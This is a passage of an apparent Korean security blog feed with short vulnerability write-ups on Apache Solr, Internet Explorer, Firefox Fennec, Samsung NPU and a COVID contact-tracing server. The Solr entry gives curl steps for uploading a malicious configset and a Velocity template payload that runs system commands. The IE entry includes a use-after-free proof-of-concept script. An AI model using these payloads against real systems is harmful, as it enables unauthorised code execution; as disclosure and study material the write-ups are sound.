&#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xC5D0;&#xB7EC; &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xBCC0;&#xD658;&#xC2DC;&#xCF1C;&#xC90D;&#xB2C8;&#xB2E4;. &#xBA54;&#xC138;&#xC9C0; &#xD15C;&#xD50C;&#xB9BF;&#xC5D0; <code>${}</code>&#xB97C; &#xD1B5;&#xD574; Expression Language&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xADF8; &#xC2E4;&#xD589;&#xACB0;&#xACFC;&#xAC00; &#xC5D0;&#xB7EC; &#xBA54;&#xC138;&#xC9C0;&#xC5D0; &#xBC18;&#xC601;&#xB429;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC774; &#xBA54;&#xC138;&#xC9C0; &#xD15C;&#xD50C;&#xB9BF;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD574;&#xCEE4;&#xAC00; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; RCE &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void add<span class="hljs-constructor">Violation(ConstraintValidatorContext <span class="hljs-params">validatorContext</span>, String <span class="hljs-params">message</span>)</span>{    validatorContext.build<span class="hljs-constructor">ConstraintViolationWithTemplate(<span class="hljs-params">message</span>)</span>.add<span class="hljs-constructor">ConstraintViolation()</span>;}</code></pre><p>CWA &#xC11C;&#xBC84;&#xB294; <code>buildConstraintViolationWithTemplate()</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xBA70; &#xADF8; &#xC778;&#xC790;&#xC778; message&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xAC12;(Diagnosis key &#xC18D; &#xB370;&#xC774;&#xD130;)&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; RCE &#xACF5;&#xACA9;&#xC5D0; &#xCDE8;&#xC57D;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; sanitizing &#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC;, bypass&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xD3C9;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>covid19</tag>
      
      <tag>ios</tag>
      
      <tag>germany</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</title>
    <link href="/2020/11/20/l0ch/2020-11-20/"/>
    <url>/2020/11/20/l0ch/2020-11-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Solr 6.6.0-6.6.5<br>Apache Solr 7.0.0-7.7.3<br>Apache Solr 8.0.0-8.6.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Solr&#xB294; Apache Lucene&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xAC80;&#xC0C9; &#xC5D4;&#xC9C4;&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xD2B9;&#xC815; &#xD615;&#xC2DD;&#xC758; XML &#xD30C;&#xC77C;&#xC744; &#xC11C;&#xBC84;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAC70;&#xB098; &#xAC80;&#xC0C9; &#xC694;&#xCCAD;&#xC744; &#xD558;&#xC5EC; &#xACB0;&#xACFC;&#xB97C; XML &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; Solr&#xC758; ConfigSet API &#xC5D0; unauthrization config upload &#xAC00; &#xAC00;&#xB2A5;&#xD574; RCE&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC6A9;&#xC790;&#xB294; ConfigSet API&#xB97C; &#xC0AC;&#xC6A9;&#xD574; configset&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xACE0; logical index&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB294; &#xC77C;&#xBD80; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xD544;&#xD130;&#xB9C1;&#xD574; &#xC545;&#xC131; &#xCEEC;&#xB809;&#xC158;&#xC774; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>configset.upload.enabled</code> &#xC635;&#xC158;&#xC774; true&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xC774;&#xB97C; UPLOAD &#xC640; CREATE &#xB85C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xBA3C;&#xC800; &#xC545;&#xC131; configset&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC744; UPLOAD &#xD569;&#xB2C8;&#xB2E4;. </p> <pre><code class="hljs jsx">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span>--data-binary@<span class="hljs-number">7.</span>zip <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=UPLOAD&amp;name=file1&quot;</span></code></pre></li><li><p>CREATE&#xB294; &#xAE30;&#xC874; configset&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; configset&#xC744; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; UPLOAD&#xB41C; configset&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; configset&#xC744; &#xB9CC;&#xB4E4;&#xBA74; &#xC545;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC778;&#xC99D; &#xAC80;&#xC0AC; &#xB85C;&#xC9C1;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=CREATE&amp;name=file3&amp;baseConfigSet=file1&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span></code></pre></li><li><p>2&#xC5D0;&#xC11C; &#xC5BB;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; configset&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC545;&#xC131; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/collections?action=CREATE&amp;numShards=1&amp;name=file2&amp;collection.configName=file3&quot;</span></code></pre></li><li><p>&#xC0DD;&#xC131;&#xB41C; &#xC545;&#xC131; &#xCEEC;&#xB809;&#xC158;&#xC740; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs jsx">http:<span class="hljs-comment">//[host]/solr/newCollection3/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&apos;&apos;)+%23set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span></code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.secpulse.com/archives/144081.html">https://www.secpulse.com/archives/144081.html</a></p><p><a href="https://issues.apache.org/jira/browse/SOLR-14925">https://issues.apache.org/jira/browse/SOLR-14925</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>apache solr</tag>
      
      <tag>unauthrization upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17053: Internet Explorer UAF 취약점</title>
    <link href="/2020/11/19/idioth/2020-11-19/"/>
    <url>/2020/11/19/idioth/2020-11-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorer&#xC5D0;&#xC11C; neutering ArrayBuffer&#xB85C; &#xC778;&#xD55C; use after free &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2020-1380&#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC9C0;&#xB9CC; JIT &#xC5D4;&#xC9C4; &#xC5C6;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>JIT &#xC5D4;&#xC9C4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; item&#xC744; TypedArray&#xB85C; &#xBCC0;&#xD658;&#xD560; &#xB54C; <em>jscript.dll</em>&#xC740; interpreter&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><code>Js::JavascriptConversion::ToNumber()</code> &#xD638;&#xCD9C;</li><li>TypedArray&#xC758; ArrayBuffer&#xAC00; detach &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;</li><li>&#xBCC0;&#xD658;&#xD560; element&#xC758; index&#xC640; TypedArray&#xC758; &#xAE38;&#xC774; &#xBE44;&#xAD50;</li><li><code>Js::JavascriptConversion::ToNumber()</code>&#xB97C; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xD558;&#xC5EC; ArrayBuffer&#xB85C; &#xAC12; &#xC124;&#xC815;</li></ol><p><code>Js::JavascriptConversion::ToNumber()</code>&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xB294; callback &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; TypedArray&#xC758; ArrayBuffer&#xB97C; free &#xD560; &#xC218; &#xC788;&#xACE0; uaf&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; &#xCCAB; &#xBC88;&#xC9F8; &#xD638;&#xCD9C; &#xD6C4; ArrayBuffer&#xAC00; detach &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC5EC; user code callback&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; free &#xB418;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB450; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C;&#xB294; &#xBCC4;&#xB2E4;&#xB978; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; uaf&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><details><summary>POC Code</summary><p><pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);<span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>{    arr[index] = value;}<span class="hljs-keyword">var</span> obj = {};obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) {        worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{};        worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);        worker.terminate();        worker = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) {}        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;    }    flag = <span class="hljs-number">1</span>;};pwn(<span class="hljs-number">0</span>, obj);</code></pre></p></details><p>&#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; <code>obj</code>&#xB85C; <code>pwn</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; item&#xC744; TypedArray&#xB85C; &#xBCC0;&#xD658;&#xD560; &#xB54C; <code>Js::JavascriptConversion::ToNumber()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; callback &#xD568;&#xC218;&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xB294; <code>flag == 0</code>&#xC774;&#xBBC0;&#xB85C; ArrayBuffer&#xAC00; neutering &#xB418;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xB450; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; ArrayBuffer&#xAC00; neutering &#xB429;&#xB2C8;&#xB2E4;. &#xB450; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C;&#xB294; ArrayBuffer&#xAC00; detach &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; uaf&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>use after free</tag>
      
      <tag>idioth</tag>
      
      <tag>internet explorer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15647: website stealing files from device</title>
    <link href="/2020/11/18/fabu1ous/2020-11-18/"/>
    <url>/2020/11/18/fabu1ous/2020-11-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">Firefox: How a website could steal all your cookies</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firefox Fennec v68.9.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox Fennec&#xC5D0;&#xC11C; Arbitrary local file access &#xCDE8;&#xC57D;&#xC810;(CVE-2020&#x2013;15647)&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD55C; &#xD574;&#xCEE4;&#xC758; &#xC6F9; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xD578;&#xB4DC;&#xD3F0;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xD0C8;&#xCDE8;&#xB2F9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC;&#xC6A9; <code>Firefox Content Provider</code>&#xC758; misconfigure&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; Firefox&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xAC00; &#xC77D;&#xC744; &#xC218; &#xC788;&#xACE0; &#xD574;&#xCEE4;&#xC758; &#xC6F9; &#xC11C;&#xBC84;&#xB85C; &#xB0B4;&#xC6A9;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC774;&#xC720;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>content://</code> URI&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xBA74; &#xD30C;&#xC77C;&#xBA85;&#xC744; &#xBC14;&#xAFB8;&#xC9C0; &#xC54A;&#xACE0; cache &#xD55C; &#xB4A4; &#xADF8;&#xACF3;&#xC73C;&#xB85C; redirect &#xD569;&#xB2C8;&#xB2E4;.</li><li><a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">file content provider</a>&#xC758; &#xACF5;&#xC720; &#xAC00;&#xB2A5; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; root-path&#xB85C; &#xC124;&#xC815;&#xB3FC;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB294; &#xB85C;&#xCEEC; html &#xD30C;&#xC77C;&#xC744; &#xC5F4; &#xB54C; <code>content://</code> URI&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. victim device&#xC5D0;&#xC11C; &#xD0C8;&#xCDE8;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xD30C;&#xC77C;(&#xC774;&#xD558; target)&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; &#xC545;&#xC131; html &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xBA74; Firefox&#xAC00; &#xD30C;&#xC77C;&#xBA85;&#xC744; &#xC720;&#xC9C0;&#xD55C; &#xCC44;&#xB85C; cache &#xD569;&#xB2C8;&#xB2E4;. &#xC545;&#xC131; html &#xD30C;&#xC77C;&#xC740; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xAC00; target&#xC744; <code>content://</code>&#xB85C; &#xC5F4;&#xAC8C; &#xD558;&#xACE0; &#xAE30;&#xC874;&#xC5D0; cache &#xB41C; &#xD30C;&#xC77C;&#xC774; target&#xC758; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; overwrite &#xB429;&#xB2C8;&#xB2E4;. &#xC545;&#xC131; html&#xC774; &#xC774;&#xB97C; &#xD30C;&#xC2F1;&#xD574; &#xD574;&#xCEE4;&#xC758; &#xC6F9; &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Samsung Neural Processing Unit memory corruption in shared memory parsing</title>
    <link href="/2020/11/17/l0ch/2020-11-17/"/>
    <url>/2020/11/17/l0ch/2020-11-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Samsung&#x2019;s Exynos-based devices (including Neural Processing Unit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC0BC;&#xC131;&#xC758; &#xC5D1;&#xC2DC;&#xB178;&#xC2A4; &#xBAA8;&#xBC14;&#xC77C; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; NPU(Neural Processing Unit)&#xB294; &#xBA38;&#xC2E0;&#xB7EC;&#xB2DD; &#xC5F0;&#xC0B0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; NPU&#xC758; Neural Network Feature Maps&#xB97C; &#xD328;&#xD0A4;&#xC9D5;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>NCP</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC785;&#xB825; &#xAC12; &#xAC80;&#xC99D;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; memory corruption&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Convolution Neural Network Feature Maps(IFM / OFM)&#xC744; &#xD328;&#xD0A4;&#xC9D5;&#xD558;&#xB294; <code>npu_session_s_graph</code> &#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800;<code>__get_session_info</code> &#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC601;&#xC5ED; ION &#xBA54;&#xBAA8;&#xB9AC; &#xBC84;&#xD37C;&#xB97C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>ION - process &#xAC04; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xC720;&#xB97C; &#xC704;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;&#xC790;</p></blockquote><p>&#xADF8;&#xB9AC;&#xACE0; <code>__config_sesison_info</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB9E4;&#xD551;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294;&#xB370;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>__pilot_parsing_ncp</code> &#xC5D0;&#xC11C; <code>temp_IFM_av</code> &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC601;&#xC5ED; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628;  <code>ncp-&gt; memory_vector_cnt</code> &#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBA3C;&#xC800; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;.</li><li>TOCTOU &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC601;&#xC5ED;&#xC5D0;&#xC11C; <code>ncp-&gt; memory_vector_cnt</code> &#xC758; &#xAC12;&#xC744; &#xB354; &#xD070; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4; <code>__second_parsing_ncp</code> &#xC5D0;&#xC11C; <code>ncp-&gt; memory_vector_cnt</code> &#xB97C; &#xB2E4;&#xC2DC; &#xC77D;&#xC5B4; <code>temp_IFM_av</code> &#xBC84;&#xD37C;&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>2&#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD070; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xB41C; <code>ncp-&gt; memory_vector_cnt</code> &#xB85C; &#xC778;&#xD574; <code>temp_IFM_av</code> &#xBC84;&#xD37C;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xBCF4;&#xB2E4; &#xB354; &#xB9CE;&#xC740; &#xAC12;&#xC744; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB418;&#xACE0; &#xC774;&#xB54C; bounds check&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC544; heap buffer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xCEE4;&#xB110; &#xC2A4;&#xB808;&#xB4DC; &#xC2A4;&#xD0DD;&#xC744; &#xD3EC;&#xD568;&#xD574; vmap&#xC758; &#xCEE4;&#xB110; &#xBC84;&#xD37C; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toctou</tag>
      
      <tag>samsung</tag>
      
      <tag>L0ch</tag>
      
      <tag>npu</tag>
      
      <tag>neural processing unit</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>exynos</tag>
      
      <tag>shared memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two Privilege Escalation Vulnerability in Ivanti Unified Endpoint Manager</title>
    <link href="/2020/11/16/idioth/2020-11-16/"/>
    <url>/2020/11/16/idioth/2020-11-16/</url>
    
